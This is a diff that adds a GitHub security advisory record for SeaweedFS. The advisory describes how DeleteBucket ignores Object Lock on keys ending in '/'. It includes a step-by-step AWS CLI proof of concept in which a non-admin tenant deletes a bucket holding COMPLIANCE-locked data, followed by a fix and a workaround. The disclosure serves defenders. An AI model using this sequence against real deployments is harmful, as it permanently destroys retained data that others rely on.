@@ -1,0 +1,46 @@
+{
+  "global": null,
+  "id": "GHSA-whp2-qr7v-7cf3",
+  "repo": {
+    "cve_id": null,
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 8.1,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-863"
+    ],
+    "description": "### Summary\r\n\r\n`DeleteBucket` refuses to delete a bucket holding objects under an active Object Lock, but the check behind that refusal never examines directory entries. A directory-marker object, an S3 key ending in `/`, can carry retention or legal hold, and `DeleteObject` enforces it; `DeleteBucket` cannot see it. An ordinary S3 user scoped to one bucket destroys an object under COMPLIANCE retention until 2036, and the rest of the bucket with it, in one call. S3 API only: no filer access, no admin rights.\r\n\r\n### Details\r\n\r\nIn `weed/s3api/s3_objectlock/object_lock_check.go:148-168`, `EntryHasActiveLock` is only reached in the `else` branch, so a directory entry is recursed into and never tested:\r\n\r\n```go\r\nif entry.IsDirectory {\r\n    if entry.Name == s3_constants.VersionsFolder {\r\n        ... checkVersionsForLocksWithClient(...)\r\n    } else {\r\n        ... recursivelyCheckLocksWithClient(...)   // never lock-checked\r\n    }\r\n} else {\r\n    if EntryHasActiveLock(entry, currentTime) {    // non-directories only\r\n```\r\n\r\nA directory-marker object *is* a directory entry, and it does carry the lock. Filer listing of `/buckets/lockb/`:\r\n\r\n```\r\nFullPath : /buckets/lockb/records\r\nMode     : 2147484153   (os.ModeDir|0771)\r\nExtended : Seaweed-X-Amz-Object-Lock-Mode: COMPLIANCE\r\n           Seaweed-X-Amz-Retention-Until-Date: 2103706177\r\n```\r\n\r\nSo `hasObjectsWithActiveLocks` reports no locks and `DeleteBucketHandler` (`weed/s3api/s3api_bucket_handlers.go:458-470`) proceeds to `s3a.rm(..., isRecursive=true)` at `:488`. The whole bucket goes because `-s3.allowDeleteBucketNotEmpty` defaults to **true** (`weed/command/server.go:180`, `filer.go:147`, `mini.go:394`, `s3.go:115`), leaving the lock gate as the only guard.\r\n\r\nThe gateway's own delete path treats the same entry as lockable: `weed/s3api/s3api_directory_marker.go:55` calls `enforceObjectLockOnEntry` and returns `ErrAccessDenied` (`:81`, `:87` cover its version history). The two paths disagree.\r\n\r\nIntroduced in 4.45 by `2a97e08ca` (#10988, \"s3: cover the directory marker key with object lock\"), which enforced the lock in the marker delete but left `object_lock_check.go` untouched. 4.40-4.44 are unaffected: there `PutObjectRetention` on a key ending in `/` fails, so no lock can exist to miss.\r\n\r\n**Fix**: lock-check the directory entry before recursing.\r\n\r\n```go\r\nif entry.IsDirectory {\r\n    if EntryHasActiveLock(entry, currentTime) {\r\n        *hasLocks = true\r\n        return true, nil\r\n    }\r\n    ...\r\n```\r\n\r\nI applied exactly this and rebuilt: `delete-bucket` on the locked marker returns `BucketNotEmpty`, and a bucket holding an *unlocked* marker plus ordinary objects still deletes normally.\r\n\r\n### PoC\r\n\r\nBuilt from `68a175ef6` (4.45), default flags:\r\n\r\n```\r\nweed server -dir=./data -ip=127.0.0.1 -filer -s3 -s3.port=8333 -s3.config=./s3.json\r\n```\r\n\r\nAttacker is a non-admin identity confined to one bucket:\r\n\r\n```json\r\n{\"name\":\"tenant\",\"credentials\":[{\"accessKey\":\"tkey\",\"secretKey\":\"tsecret\"}],\r\n \"actions\":[\"Read:lockb/*\",\"Write:lockb/*\",\"List:lockb\",\"List:lockb/*\",\r\n            \"Tagging:lockb/*\",\"DeleteBucket:lockb\"]}\r\n```\r\n\r\n```\r\n$ export AWS_EC2_METADATA_DISABLED=true AWS_DEFAULT_REGION=us-east-1\r\n$ EP=http://127.0.0.1:8333 ; printf '' > empty\r\n\r\n$ AWS_ACCESS_KEY_ID=adminkey AWS_SECRET_ACCESS_KEY=adminsecret \\\r\n    aws --endpoint-url $EP s3api create-bucket --bucket lockb --object-lock-enabled-for-bucket\r\n{\r\n    \"Location\": \"/lockb\"\r\n}\r\n\r\n$ export AWS_ACCESS_KEY_ID=tkey AWS_SECRET_ACCESS_KEY=tsecret\r\n\r\n$ aws --endpoint-url $EP s3api create-bucket --bucket proof-not-admin\r\nAn error occurred (AccessDenied) when calling the CreateBucket operation: Access Denied.\r\n\r\n$ aws --endpoint-url $EP s3api put-object --bucket lockb --key 'records/' --body empty\r\n{\r\n    \"ETag\": \"\\\"d41d8cd98f00b204e9800998ecf8427e\\\"\"\r\n}\r\n\r\n$ aws --endpoint-url $EP s3api put-object-retention --bucket lockb --key 'records/' \\\r\n      --retention \"Mode=COMPLIANCE,RetainUntilDate=2036-08-30T10:49:37Z\"\r\n\r\n$ aws --endpoint-url $EP s3api get-object-retention --bucket lockb --key 'records/'\r\n{\r\n    \"Retention\": {\r\n        \"Mode\": \"COMPLIANCE\",\r\n        \"RetainUntilDate\": \"2036-08-30T12:49:37+02:00\"\r\n    }\r\n}\r\n```\r\n\r\nControl. The lock is enforced:\r\n\r\n```\r\n$ aws --endpoint-url $EP s3api delete-object --bucket lockb --key 'records/'\r\nAn error occurred (AccessDenied) when calling the DeleteObject operation: Access Denied.\r\n```\r\n\r\nThe same user deletes the bucket instead:\r\n\r\n```\r\n$ aws --endpoint-url $EP s3api delete-bucket --bucket lockb ; echo $?\r\n0\r\n\r\n$ aws --endpoint-url $EP s3api list-objects-v2 --bucket lockb\r\nAn error occurred (NoSuchBucket) when calling the ListObjectsV2 operation: The specified bucket does not exist\r\n\r\n$ curl -o /dev/null -w '%{http_code}\\n' http://127.0.0.1:8888/buckets/lockb/records/\r\n404\r\n```\r\n\r\n**Expected**: `DeleteBucket` refuses while any object carries an active lock. **Actual**: it proceeds and destroys the locked object.\r\n\r\nAlso verified: `put-object-legal-hold --legal-hold Status=ON` behaves identically; a bucket holding `plain1.txt`, `nested/plain2.txt` and one locked `records/` is destroyed whole; and the lock is not merely unenforced against whoever set it. With **admin** setting the retention, admin itself is refused `delete-object` while the tenant still destroys it via `delete-bucket`.\r\n\r\n**Bounds tested, so you do not have to.** These still block correctly with `BucketNotEmpty`: a locked regular object, a locked non-current version behind a delete marker, and a locked object in a nested prefix. The gap is specific to keys ending in `/`. Pagination beyond 10k entries untested.\r\n\r\n### Impact\r\n\r\nBypass of Object Lock / retention where it is configured, and permanent, irreversible loss of the protected data plus the rest of the bucket. `SECURITY.md` lists both as in scope. COMPLIANCE is the mode no principal, including the bucket owner, is meant to be able to override.\r\n\r\nReachable by any authenticated S3 identity holding `DeleteBucket` on a bucket it already uses: an ordinary tenant permission, not an administrative one.\r\n\r\n**Workaround**: start the gateway with `allowDeleteBucketNotEmpty=false` (`-s3.allowDeleteBucketNotEmpty` on `weed server`/`weed filer`, `-allowDeleteBucketNotEmpty` on `weed s3`). Verified: `delete-bucket` then returns `BucketNotEmpty` and the retention survives. Not the default.\r\n",
+    "ghsa_id": "GHSA-whp2-qr7v-7cf3",
+    "html_url": "https://github.com/seaweedfs/seaweedfs/security/advisories/GHSA-whp2-qr7v-7cf3",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-whp2-qr7v-7cf3"
+      }
+    ],
+    "published_at": "2026-11-09T19:46:08Z",
+    "references": [],
+    "severity": "high",
+    "summary": "DeleteBucket ignores Object Lock on directory-marker keys",
+    "updated_at": "2026-11-09T19:46:08Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "go",
+          "name": "github.com/seaweedfs/seaweedfs"
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": ">= 4.45"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "seaweedfs/seaweedfs"
+}
